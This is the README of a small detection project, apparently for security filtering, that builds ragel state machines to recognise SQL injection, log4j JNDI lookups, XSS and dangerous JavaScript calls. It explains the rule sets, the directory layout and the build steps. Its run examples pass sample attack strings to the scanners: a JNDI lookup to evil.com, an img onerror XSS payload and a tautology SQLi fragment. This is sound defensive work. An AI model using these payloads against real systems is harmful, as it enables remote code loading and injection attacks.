# sql_ragel

用 ragel 把语法写成状态机的小实验。输入先走词法切 token，再在 token 流上跑状态机，识别 SQL 骨架、SQLi 攻击特征、log4j 查找表达式和 XSS 攻击特征。

## 内容

- `sql_syntax`：SQL 语法骨架，识别 `expr` / `select_stmt` / `constant_value`。
- `sqli_rules`：24 条 SQLi 攻击规则（恒真条件、布尔注入、UNION/堆叠、危险函数、子查询、语句片段等）。
- `log4j_lookup`：识别 `${...}` 表达式，按前缀归约分类 JNDI / SENSITIVE / CHAIN / EXPR。
- `html5_xss_rules`：6 条 XSS 规则（黑标签、黑属性、黑 URL、style 注入、危险注释 + `dangerous_js` 语义分析）。
- `js_syntax` / `js_danger`：JS 表达式骨架与危险调用检测。

## 目录

```
src/                 基础设施：词法层 + 共享片段 + 语法骨架
  sql/               SQL 词法（sql_tokens）+ 共享片段 + 语法骨架
  log4j/             log4j 查找表达式词法（lookup）
  html5/             HTML5 词法（tokenizer）+ 共享片段
  js/                JS 词法 + 共享片段 + 语法骨架 + 危险调用检测
rules/               检测规则库
  html5_xss/         XSS 规则（html5_xss_rules + corpus/xss.log）
  sqli/              SQLi 攻击规则（sqli_rules）
examples/            调用示例（驱动 + 断言）
  sql_scan.c         sql 驱动：打印 token 流和骨架命中
  sqli_scan.c        sqli 驱动
  log4j_scan.c       log4j 驱动
  html5_xss_scan.c   html5_xss 驱动
  js_scan.c          js 驱动
  test_sql.sh        sql 骨架断言
  test_sqli.sh       sqli 断言
  test_log4j.sh      log4j 断言
  test_html5_xss.sh  html5_xss 断言
  test_js.sh         js 断言
Makefile             构建（make / make test）
CMakeLists.txt       等价 cmake 构建
```

约定：`src/` 放可复用的词法/语法基础设施，`rules/` 只放检测规则。
规则若与共享片段不在同一目录（`sqli_rules` ↔ `sql_shared`、`html5_xss_rules` ↔ `html5_shared`），ragel 生成时需 `-I` 指向 `src/` 对应目录。

## 构建与测试

需要 ragel 和 gcc。

```
make -j        # 构建 sql_scan / sqli_scan / log4j_scan / html5_xss_scan / js_scan
make test      # 跑五套断言（sql 骨架 / sqli / log4j / html5_xss / js）
```

cmake 等价：

```
cmake -S . -B build && cmake --build build -j
cmake --build build --target validate_ragel
```

## 运行

```
./build/ragel/sql_scan  'SELECT * FROM users WHERE 1=1'
./build/ragel/sqli_scan '1=1 OR 1=2'
./build/ragel/log4j_scan '${jndi:ldap://evil.com/a}'
./build/ragel/html5_xss_scan  '<img onerror=alert(1)>'
```

## 说明

- 规则只改 `.rl`，重新构建即可；生成的 C 是中间产物，不要手工改。
- 驱动只 include 头文件并链接 `libragel_sql.a`，不接触生成的 `.c`。
- 递归（括号嵌套、子查询）用 ragel 的 fcall/fret 实现，见各 `.rl` 头注释。
